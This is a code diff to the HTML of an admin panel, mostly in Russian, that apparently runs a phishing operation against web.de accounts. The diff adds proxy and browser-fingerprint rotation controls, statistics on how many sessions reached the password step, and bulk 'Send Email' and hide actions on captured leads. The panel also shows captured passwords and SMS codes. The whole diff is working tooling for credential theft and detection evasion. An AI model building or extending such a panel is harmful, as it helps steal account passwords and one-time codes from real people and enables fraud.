@@ -225,8 +225,11 @@
                 <h3 id="config-proxies-block-fp-title" class="config-proxies-block-title admin-section-title">Отпечатки</h3>
                 <p id="config-webde-fp-list-message" class="config-msg hidden"></p>
                 <div id="config-webde-fp-list" class="config-webde-fp-list" aria-label="Список отпечатков"></div>
+                <textarea id="config-webde-fp-indices-text" class="config-input config-webde-fp-indices-textarea admin-code-editor" rows="6" placeholder="Индексы отпечатков (по одному на строку). Например: 0&#10;1&#10;2" spellcheck="false"></textarea>
                 <div class="config-control-row config-proxies-actions">
                   <button type="button" id="config-webde-fp-check" class="btn btn-primary btn-sm">Проверить</button>
+                  <button type="button" id="config-webde-fp-indices-write-0-99" class="btn btn-ghost btn-sm" title="Перезаписать webde_fingerprint_indices.txt значениями 0..99">0–99</button>
+                  <button type="button" id="config-webde-fp-indices-save" class="btn btn-primary btn-sm admin-btn-save">Сохранить</button>
                 </div>
               </section>
               <section class="config-proxies-block" aria-labelledby="config-proxies-block-probe-title">
@@ -241,6 +244,52 @@
                 <div id="config-webde-probe-results-wrap" class="config-webde-probe-results-wrap">
                   <div class="config-proxies-result-summary" id="config-webde-probe-results-summary">Результаты появятся после «Старт».</div>
                   <div id="config-webde-probe-results-list" class="config-webde-probe-result-list"></div>
+                </div>
+              </section>
+              <section class="config-proxies-block" aria-labelledby="config-proxies-block-stats-title">
+                <h3 id="config-proxies-block-stats-title" class="config-proxies-block-title admin-section-title">Статистика Proxy/Fingerprint</h3>
+                <div class="config-control-row config-proxies-actions" style="flex-wrap: wrap;">
+                  <button type="button" id="config-proxy-fp-stats-refresh" class="btn btn-ghost btn-sm">Обновить</button>
+                  <button type="button" id="config-proxy-fp-stats-purge-orphans" class="btn btn-ghost btn-sm" title="Удалить статистику для прокси, которых больше нет в proxy.txt">Удалить не из списка</button>
+                  <span id="config-proxy-fp-stats-message" class="config-msg hidden" style="margin-left: auto;"></span>
+                </div>
+                <div class="config-proxy-fp-stats-grid">
+                  <div class="config-proxy-fp-stats-card">
+                    <div class="config-proxy-fp-stats-card-title">Proxy</div>
+                    <div class="config-proxy-fp-stats-table-wrap">
+                      <table class="config-proxy-fp-stats-table">
+                        <thead>
+                          <tr>
+                            <th>Прокси</th>
+                            <th>Пар</th>
+                            <th>На пароль</th>
+                            <th>Не до пароля</th>
+                            <th>%</th>
+                            <th></th>
+                          </tr>
+                        </thead>
+                        <tbody id="config-proxy-stats-body"></tbody>
+                      </table>
+                    </div>
+                  </div>
+                  <div class="config-proxy-fp-stats-card">
+                    <div class="config-proxy-fp-stats-card-title">Fingerprint</div>
+                    <div class="config-proxy-fp-stats-table-wrap">
+                      <table class="config-proxy-fp-stats-table">
+                        <thead>
+                          <tr>
+                            <th>Отпечаток</th>
+                            <th>Пар</th>
+                            <th>На пароль</th>
+                            <th>Не до пароля</th>
+                            <th>%</th>
+                            <th></th>
+                          </tr>
+                        </thead>
+                        <tbody id="config-fp-stats-body"></tbody>
+                      </table>
+                    </div>
+                  </div>
                 </div>
               </section>
               <div class="config-proxies-terminal-wrap">
@@ -330,8 +379,20 @@
   <div class="layout">
     <aside class="sidebar" id="sidebar">
       <div id="bulk-actions" class="bulk-actions hidden">
-        <button type="button" id="btn-bulk-delete" class="btn btn-danger">Delete</button>
-        <button type="button" id="btn-bulk-save" class="btn btn-primary">Save</button>
+        <div class="bulk-actions-left">
+          <button type="button" id="btn-bulk-all" class="btn btn-ghost btn-sm" title="Toggle selection on current page">All</button>
+          <span id="bulk-selected-count" class="bulk-selected-count">0</span>
+        </div>
+        <div class="bulk-actions-right">
+          <select id="bulk-action" class="bulk-action-select" aria-label="Bulk action">
+            <option value="hide">Скрыть выбранных</option>
+            <option value="hide_except_success">Скрыть кроме Успешных</option>
+            <option value="hide_send_email">Скрыть Send Email</option>
+            <option value="unhide">Отменить скрытие</option>
+            <option value="send_email">Send Email</option>
+          </select>
+          <button type="button" id="btn-bulk-apply" class="btn btn-primary btn-sm">Применить</button>
+        </div>
       </div>
       <div id="leads-pagination-top" class="leads-pagination leads-pagination--top hidden"></div>
       <div class="sessions-list" id="sessions-list-wrap">
@@ -366,22 +427,6 @@
           <div class="detail-row">
             <div class="detail-label">Password kl</div>
             <div class="detail-value" id="detail-password-kl"></div>
-          </div>
-          <div class="detail-row">
-            <div class="detail-label">Форма (страница submit)</div>
-            <div class="detail-value" id="detail-submit-form" title="Что прислал клиент в clientFormBrand">—</div>
-          </div>
-          <div class="detail-row">
-            <div class="detail-label">Host при submit</div>
-            <div class="detail-value" id="detail-submit-host" title="Бренд по Host запроса на последнем submit">—</div>
-          </div>
-          <div class="detail-row">
-            <div class="detail-label">Brand в записи</div>
-            <div class="detail-value" id="detail-record-brand">—</div>
-          </div>
-          <div class="detail-row hidden" id="detail-submit-warn-row">
-            <div class="detail-label">Внимание</div>
-            <div class="detail-value detail-submit-warn" id="detail-submit-warn"></div>
           </div>
           <div class="detail-row" id="detail-sms-row" style="display:none">
             <div class="detail-label">SMS code</div>
